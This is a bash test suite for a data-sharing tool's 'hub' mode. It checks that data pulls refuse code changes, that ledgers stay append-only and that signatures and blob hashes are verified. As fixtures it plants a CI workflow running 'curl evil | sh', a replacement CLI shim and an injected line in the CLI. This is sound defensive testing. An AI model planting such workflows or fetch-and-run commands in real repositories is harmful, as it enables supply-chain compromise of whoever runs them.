#!/usr/bin/env bash
# Tool/data split gate (2026-09-25): hubs are data-only repos; a data pull can never
# bring code; `hub check` is the PR/CI gate. Throwaway everything.
set -uo pipefail
unset COMMONS_SIGNING_KEY COMMONS_ROOT COMMONS_AGENT COMMONS_EXEC COMMONS_REQUIRE_SIG

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(dirname "$HERE")"
COMMONS="$REPO/bin/commons"
PASS=0 FAIL=0
ok()   { printf '  \033[32mok\033[0m   %s\n' "$1"; PASS=$((PASS+1)); }
bad()  { printf '  \033[31mFAIL\033[0m %s\n' "$1"; FAIL=$((FAIL+1)); }
check(){ if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (want $3, got $2)"; fi; }
head_() { printf '\n\033[1m%s\033[0m\n' "$1"; }

_PROBEKEY="$(mktemp -t commons-probe-XXXXXX)"
python3 -c "import secrets,sys;open(sys.argv[1],'w').write('0x'+secrets.token_hex(32))" "$_PROBEKEY"
if ! MESSAGE=probe COMMONS_SIGNING_KEY="$_PROBEKEY" node "$REPO/lib/sign-message.mjs" >/dev/null 2>&1; then
  rm -f "$_PROBEKEY"; echo "test-hub: signer not functional"; exit 1
fi
rm -f "$_PROBEKEY"

LAB="$(mktemp -d -t commons-hub-XXXXXX)"
trap 'rm -rf "$LAB"' EXIT
export GIT_AUTHOR_NAME=test GIT_AUTHOR_EMAIL=test@local
export GIT_COMMITTER_NAME=test GIT_COMMITTER_EMAIL=test@local
W="$LAB/w"; mkdir -p "$W"
rc() { "$@" >"$W/out.txt" 2>"$W/err.txt"; echo $?; }
both() { cat "$W/out.txt" "$W/err.txt"; }
KA="$LAB/a.key"; KB="$LAB/b.key"
for k in "$KA" "$KB"; do python3 -c "import secrets;open('$k','w').write('0x'+secrets.token_hex(32))"; chmod 600 "$k"; done
# Run as lead (A) / contributor (B) from INSIDE their hub clone: discovery, not env.
a() { ( cd "$HA" && COMMONS_AGENT=lead COMMONS_SIGNING_KEY="$KA" "$COMMONS" "$@" ); }
b() { ( cd "$HB" && COMMONS_AGENT=contrib COMMONS_SIGNING_KEY="$KB" "$COMMONS" "$@" ); }
HA="$LAB/hub-a"; HB="$LAB/hub-b"; BARE="$LAB/hub.git"

head_ "hub init + discovery"
check "hub init succeeds" "$(rc "$COMMONS" hub init "$HA" --name 'Test hub' --tool-repo o/rc)" "0"
check "marker written" "$([ -f "$HA/.commons-hub" ] && echo yes)" "yes"
check "CI workflow written" "$(grep -c 'commons hub check' "$HA/.github/workflows/hub-check.yml" | tr -d ' ' | sed 's/[2-9]/1/')" "1"
check "CI pins the tool repo" "$(grep -c 'repository: o/rc' "$HA/.github/workflows/hub-check.yml")" "1"
check "README names the tool repo" "$(grep -q "github.com/o/rc" "$HA/README.md" && echo yes)" "yes"
check "CI needs no secrets (public tool: no deploy key)" \
  "$(grep -cE 'secrets\.|ssh-key' "$HA/.github/workflows/hub-check.yml")" "0"
check "hub has no code" "$([ ! -e "$HA/bin" ] && [ ! -e "$HA/lib" ] && echo yes)" "yes"
check "init refuses a non-empty dir" "$(rc "$COMMONS" hub init "$HA")" "1"
mkdir -p "$HA/registry/artifacts/deep"
check "where: found from a subdirectory" \
  "$(cd "$HA/registry/artifacts/deep" && "$COMMONS" hub where 2>/dev/null)" "$HA"
rmdir "$HA/registry/artifacts/deep"
check "where: COMMONS_ROOT still wins" "$(cd "$HA" && COMMONS_ROOT=/tmp/x "$COMMONS" hub where 2>/dev/null)" "/tmp/x"
check "where: reports discovery source" "$(cd "$HA" && "$COMMONS" hub where 2>&1 >/dev/null | grep -c marker)" "1"

head_ "tool checkout without a registry refuses to act as one"
T="$LAB/tool"; mkdir -p "$T"; cp -r "$REPO/bin" "$REPO/lib" "$T/"; mkdir -p "$T/registry"
cp "$REPO/registry/exec-policy.example.json" "$T/registry/"
check "list outside any hub exits 1" "$(cd "$LAB" && rc "$T/bin/commons" list)" "1"
check "error points at hub init" "$(grep -c 'commons hub init' "$W/err.txt")" "1"
check "nothing was created in the tool checkout" "$([ ! -e "$T/registry/artifacts" ] && echo yes)" "yes"
check "hub subcommands still work from the tool" "$(cd "$LAB" && rc "$T/bin/commons" hub where)" "0"

head_ "lead bootstraps the hub; contributor clones it"
ADDR_A=$(a peer whoami | head -1); ADDR_B=$(b peer whoami 2>/dev/null | head -1 || true)
a peer add "$ADDR_A" --agent-id lead --trust full --note self >/dev/null
printf 'x,y\n1,2\n' > "$W/a.csv"
DA=$(a publish dataset "$W/a.csv" "Lead dataset" --license CC0-1.0 --obtainability open --criteria "fixture" 2>/dev/null | tail -1)
check "lead publishes inside the hub" "$(echo "$DA" | grep -c '^ds-')" "1"
check "artifact landed in the hub, not the tool" "$([ -f "$HA/registry/artifacts/$DA.json" ] && [ ! -e "$REPO/registry/artifacts/$DA.json" ] && echo yes)" "yes"
( cd "$HA" && git add -A && git commit -qm "hub: lead dataset" )
git init -q --bare -b main "$BARE"
( cd "$HA" && git remote add origin "$BARE" )
check "lead pushes through the gate" "$(cd "$HA" && COMMONS_SIGNING_KEY="$KA" rc "$COMMONS" push origin)" "0"
git clone -q "$BARE" "$HB"
ADDR_B=$(b peer whoami | head -1)
b peer add "$ADDR_B" --agent-id contrib --trust full --note self >/dev/null
b peer add "$ADDR_A" --agent-id lead --trust full --note lead >/dev/null
a peer add "$ADDR_B" --agent-id contrib --trust datasets-only --note contributor >/dev/null
check "contributor's clone discovers the hub" "$(cd "$HB" && "$COMMONS" hub where 2>/dev/null)" "$HB"
check "contributor sees the lead's dataset" "$(b list 2>/dev/null | grep -c "$DA")" "1"

head_ "data-only contribution: CI check passes, lead ingests"
( cd "$HB" && git checkout -qb contrib-data )
printf 'p,q\n3,4\n' > "$W/b.csv"
DB=$(b publish dataset "$W/b.csv" "Contrib dataset" --license CC0-1.0 --obtainability open --criteria fixture 2>/dev/null | tail -1)
( cd "$HB" && git add -A && git commit -qm "contrib: dataset" && git push -q origin contrib-data )
check "hub check OK on a data-only branch" "$(cd "$HB" && rc "$COMMONS" hub check --base origin/main)" "0"
check "lead ingests the branch via --branch" "$(cd "$HA" && rc "$COMMONS" pull origin --branch contrib-data)" "0"
check "contrib dataset now in lead's hub" "$([ -f "$HA/registry/artifacts/$DB.json" ] && echo yes)" "yes"
( cd "$HA" && COMMONS_SIGNING_KEY="$KA" "$COMMONS" push origin >/dev/null 2>&1 )   # lead publishes the merge

head_ "code can never ride in on a data pull"
( cd "$HB" && git checkout -q main && git pull -q origin main 2>/dev/null; git checkout -qb contrib-code )
printf 'y\n' > "$W/c.csv"
DC=$(b publish dataset "$W/c.csv" "Innocent-looking dataset" --license CC0-1.0 --obtainability open --criteria fixture 2>/dev/null | tail -1)
mkdir -p "$HB/.github/workflows" "$HB/bin"
printf 'on: push\njobs: {x: {runs-on: ubuntu-latest, steps: [{run: "curl evil | sh"}]}}\n' > "$HB/.github/workflows/steal.yml"
printf '#!/bin/sh\necho PWNED\n' > "$HB/bin/commons"
( cd "$HB" && git add -A && git commit -qm "contrib: dataset (+ workflow + shim)" && git push -q origin contrib-code )
check "hub check flags non-data paths" "$(cd "$HB" && rc "$COMMONS" hub check --base origin/main)" "1"
check "…naming the workflow" "$(grep -c 'non-data path changed: .github/workflows/steal.yml' "$W/out.txt")" "1"
check "…and the shim" "$(grep -c 'non-data path changed: bin/commons' "$W/out.txt")" "1"
HEAD_BEFORE=$(cd "$HA" && git rev-parse HEAD)
check "pull refuses the mixed branch" "$(cd "$HA" && rc "$COMMONS" pull origin --branch contrib-code)" "1"
check "refusal lists the offending paths" "$(grep -c 'bin/commons' "$W/err.txt")" "1"
check "nothing merged (HEAD unchanged)" "$(cd "$HA" && git rev-parse HEAD)" "$HEAD_BEFORE"
check "the valid dataset did NOT sneak in either" "$([ ! -e "$HA/registry/artifacts/$DC.json" ] && echo yes)" "yes"
check "refusal quarantined" "$(grep -c non-data-paths "$HA/registry/quarantine.log")" "1"
check "--dry-run also refuses (guard runs before validation)" "$(cd "$HA" && rc "$COMMONS" pull origin --branch contrib-code --dry-run)" "1"
check "--allow-code merges after review" "$(cd "$HA" && rc "$COMMONS" pull origin --branch contrib-code --allow-code)" "0"; both | tail -5 > "$LAB/allow.txt"
check "…and says what it merged" "$(grep -c "allow-code: merging" "$LAB/allow.txt")" "1"; cat "$LAB/allow.txt"

head_ "legacy single-repo layout gets the same guard"
L="$LAB/legacy"; LB="$LAB/legacy-b"; LBARE="$LAB/legacy.git"
mkdir -p "$L"; cp -r "$REPO/bin" "$REPO/lib" "$L/"; mkdir -p "$L/registry/artifacts" "$L/store/sha256"
cp "$REPO/registry/exec-policy.example.json" "$L/registry/"
( cd "$L" && git init -q -b main && printf '__pycache__/\n' > .gitignore && git add -A && git commit -qm init )
git init -q --bare -b main "$LBARE"; ( cd "$L" && git remote add origin "$LBARE" && git push -q origin main )
git clone -q "$LBARE" "$LB"
sed -i '2i import sys; sys.stderr.write("PWNED\\n")' "$LB/bin/commons"
( cd "$LB" && git commit -qam "quietly edit the CLI" && git push -q origin main )
check "legacy pull refuses a CLI edit" "$(COMMONS_ROOT= rc "$L/bin/commons" pull origin)" "1"
check "puller's CLI untouched" "$(grep -c PWNED "$L/bin/commons")" "0"

head_ "hub check: append-only ledgers, per-signer logs, signatures"
( cd "$HB" && git checkout -q main && git reset -q --hard origin/main && git checkout -qb tamper )
LOGB="registry/ledger/$(echo "$ADDR_B" | tr 'A-Z' 'a-z').jsonl"
LOGA="registry/ledger/$(echo "$ADDR_A" | tr 'A-Z' 'a-z').jsonl"
# (1) rewrite the lead's log
sed -i '1s/"publish"/"republish"/' "$HB/$LOGA"
( cd "$HB" && git commit -qam tamper1 )
check "rewritten ledger line fails" "$(cd "$HB" && rc "$COMMONS" hub check --base origin/main)" "1"
check "…as a rewrite" "$(grep -c 'ledger rewritten, not appended' "$W/out.txt")" "1"
check "…and as a bad signature" "$(grep -c 'BAD SIGNATURE' "$W/out.txt")" "1"
( cd "$HB" && git reset -q --hard origin/main )
# (2) B's valid entry copied into A's log
tail -1 "$HB/$LOGB" >> "$HB/$LOGA" 2>/dev/null || true
( cd "$HB" && git commit -qam tamper2 )
check "entry in someone else's log fails" "$(cd "$HB" && rc "$COMMONS" hub check --base origin/main)" "1"
check "…named as such" "$(grep -c "written into someone else's log" "$W/out.txt")" "1"
( cd "$HB" && git reset -q --hard origin/main )
# (3) unsigned contribution
printf 'u\n' > "$W/u.csv"
( cd "$HB" && COMMONS_AGENT=anon "$COMMONS" publish dataset "$W/u.csv" "unsigned" --license CC0-1.0 --obtainability open --criteria f >/dev/null 2>&1; git add -A; git commit -qm unsigned )
check "unsigned contribution fails" "$(cd "$HB" && rc "$COMMONS" hub check --base origin/main)" "1"
check "…with sign-before-contributing hint" "$(grep -c 'sign before contributing' "$W/out.txt")" "1"
( cd "$HB" && git reset -q --hard origin/main )
# (4) deletion
( cd "$HB" && git rm -q "registry/artifacts/$DA.json" && git commit -qm delete )
check "deleting registry content fails" "$(cd "$HB" && rc "$COMMONS" hub check --base origin/main)" "1"
check "…as append-only violation" "$(grep -c 'append-only' "$W/out.txt")" "1"
( cd "$HB" && git reset -q --hard origin/main )
# (5) corrupted blob, full check (no --base)
BLOB=$(find "$HB/store/sha256" -type f ! -name .gitkeep | head -1); echo junk >> "$BLOB"
check "full check catches a corrupted blob" "$(cd "$HB" && rc "$COMMONS" hub check)" "1"
check "…as hash mismatch" "$(grep -c 'blob does not match its hash' "$W/out.txt")" "1"
( cd "$HB" && git checkout -q -- store )
check "clean hub passes the full check" "$(cd "$HB" && rc "$COMMONS" hub check)" "0"

printf '\n\033[1mtest-hub: %d passed, %d failed\033[0m\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
